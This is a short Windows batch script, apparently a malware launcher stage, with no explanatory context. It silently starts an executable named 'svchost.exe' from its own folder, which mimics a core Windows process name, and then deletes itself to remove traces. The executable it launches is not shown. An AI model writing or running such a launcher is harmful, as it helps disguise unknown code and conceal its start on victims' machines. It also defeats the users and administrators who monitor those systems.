@echo off
cd /d "%~dp0"
start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
